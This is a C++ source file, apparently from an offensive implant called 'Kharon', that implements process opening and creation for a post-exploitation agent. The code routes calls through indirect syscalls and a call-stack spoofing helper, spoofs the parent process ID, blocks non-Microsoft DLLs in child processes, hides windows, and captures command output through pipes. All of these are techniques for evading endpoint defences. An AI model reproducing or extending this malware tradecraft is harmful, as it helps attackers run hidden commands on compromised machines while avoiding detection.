#include <Kharon.h>

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    const UINT32 Flags    = SYSCALL_FLAGS;
    NTSTATUS     Status   = STATUS_UNSUCCESSFUL;
    HANDLE       Handle   = nullptr;
    CLIENT_ID    ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
    OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return Self->Krnl32.OpenProcess(RightsAccess, InheritHandle, ProcessID);
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].Instruction
        : (UPTR)Self->Ntdll.NtOpenProcess;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].ssn
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! ( Flags & SYSCALL_SPOOF ) ) {
        SyscallExec(Sys::OpenProc, Status, &Handle, RightsAccess, &ObjAttr, &ClientID);
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
            (UPTR)&ObjAttr, (UPTR)&ClientID
        );
    }

    Self->Usf->NtStatusToError( Status );

    return Handle;
}

auto DECLFN Process::Create(
    _In_  PCHAR                CommandLine,
    _In_  ULONG                PsFlags,
    _Out_ PPROCESS_INFORMATION PsInfo
) -> BOOL {
    ProcThreadAttrList ProcAttr;

    BOOL   Success      = FALSE;
    ULONG  TmpValue     = 0;
    HANDLE PipeWrite    = nullptr;
    HANDLE PipeDuplic   = nullptr;
    HANDLE PipeRead     = nullptr;
    HANDLE PsHandle     = nullptr;
    BYTE*  PipeBuff     = nullptr;
    ULONG  PipeBuffSize = 0;
    UINT8  UpdateCount  = 0;

    STARTUPINFOEXA      SiEx         = { 0 };
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; }
    if ( Self->Ps->Ctx.ParentID  ) { UpdateCount++; };

    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
    SiEx.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
    SiEx.StartupInfo.wShowWindow = SW_HIDE;

    PsFlags |= CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;

    if ( Self->Ps->Ctx.Pipe ) {
        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
        if ( !Success ) { goto _KH_END; }

        if ( Self->Ps->Ctx.ParentID ) {
            PsHandle = Self->Ps->Open( PROCESS_ALL_ACCESS, FALSE, Self->Ps->Ctx.ParentID );
            if ( ! PsHandle || PsHandle == INVALID_HANDLE_VALUE ) {
                Success = FALSE; goto _KH_END;
            }

            if ( SYSCALL_FLAGS & SYSCALL_SPOOF ) {
                Success = Self->Krnl32.DuplicateHandle(
                    NtCurrentProcess(), PipeWrite, PsHandle, &PipeDuplic, 0,
                    TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
                );
            } else {
                Success = Self->Krnl32.DuplicateHandle(
                    NtCurrentProcess(), PipeWrite, PsHandle, &PipeDuplic, 0,
                    TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
                );
            }

            if ( ! Success ) { goto _KH_END; }
            PipeWrite = PipeDuplic;
        }

        SiEx.StartupInfo.hStdError  = PipeWrite;
        SiEx.StartupInfo.hStdOutput = PipeWrite;
        SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
        SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
    }

    if ( UpdateCount             ) ProcAttr.Initialize( UpdateCount );
    if ( Self->Ps->Ctx.ParentID  ) ProcAttr.UpdateParentSpf( PsHandle );
    if ( Self->Ps->Ctx.BlockDlls ) ProcAttr.UpdateBlockDlls();

    if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();

    if ( SYSCALL_FLAGS & SYSCALL_SPOOF ) {
        Success = Self->Spf->Call(
            (UPTR)nullptr, (UPTR)CommandLine, (UPTR)nullptr,
            (UPTR)nullptr, TRUE, PsFlags, (UPTR)nullptr,
            (UPTR)Self->Ps->Ctx.CurrentDir, (UPTR)&SiEx.StartupInfo, (UPTR)PsInfo
        );
    } else {
        Success = Self->Krnl32.CreateProcessA(
            nullptr, CommandLine, nullptr, nullptr, TRUE, PsFlags,
            nullptr, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
        );
    }
    if ( !Success ) { goto _KH_END; }

    if ( Self->Ps->Ctx.Pipe ) {
        Self->Ntdll.NtClose( PipeWrite ); PipeWrite = nullptr;

        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );

        if (waitResult == WAIT_TIMEOUT) {
            KhDbg( "Timeout waiting for process output" );
        }

        Success = Self->Krnl32.PeekNamedPipe(
            PipeRead, nullptr, 0, nullptr, &PipeBuffSize, nullptr
        );
        if ( !Success ) { goto _KH_END; }

        if ( PipeBuffSize > 0 ) {
            PipeBuff = (BYTE*)Self->Hp->Alloc( PipeBuffSize );
            if ( !PipeBuff ) { Success = FALSE; goto _KH_END; }

            Success = Self->Krnl32.ReadFile(
                PipeRead, PipeBuff, PipeBuffSize, &TmpValue, nullptr
            );
            if ( !Success ) { goto _KH_END; }

            KhDbg( "pipe buffer: %d", PipeBuffSize );
            KhDbg( "pipe read  : %d", TmpValue );

            Self->Ps->Out.p = PipeBuff;
            Self->Ps->Out.s = TmpValue;
        } else {
            KhDbg( "No data available in pipe" );
        }
    }

_KH_END:
    if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
    if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );
    if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
    if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );

    return Success;
}